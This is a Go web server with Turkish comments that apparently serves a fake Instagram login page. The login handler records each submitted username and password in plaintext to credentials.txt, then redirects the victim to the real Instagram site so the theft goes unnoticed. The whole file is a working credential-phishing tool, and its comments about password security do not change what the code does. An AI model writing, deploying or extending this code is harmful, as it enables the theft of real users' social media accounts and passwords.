package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"

	"github.com/gorilla/mux"
)

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.HandleFunc("/login", loginGet).Methods("GET")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8080", r))
}

func login(w http.ResponseWriter, r *http.Request) {
	// Form verilerini al
	username := r.FormValue("username")
	password := r.FormValue("password")

	// Basit validasyon kontrolü
	if username == "" || password == "" {
		http.Redirect(w, r, "/login?error=empty_fields", http.StatusSeeOther)
		return
	}

	// Dosyayı aç (şifre güvenliği açısından farklı yöntemler düşünmelisiniz)
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		log.Fatal(err)
	}
	defer fh.Close()
	// Giriş başarılı, kullanıcı adı ve şifreyi dosyaya yaz (kullanıcı şifresi plaintext olarak saklanmamalı)
	_, err = fh.WriteString("username: " + username + " password: " + password + "\n")
	if err != nil {
		fmt.Println("Dosyaya yazma hatası:", err)
		return
	}

	// Giriş başarılı, Instagram sayfasına yönlendir
	http.Redirect(w, r, "https://www.instagram.com", http.StatusSeeOther)
}

func loginGet(w http.ResponseWriter, r *http.Request) {
	tmp, err := template.ParseFiles("./public/index.html")
	if err != nil {
		log.Println(err)
	}
	tmp.Execute(w, nil)
}
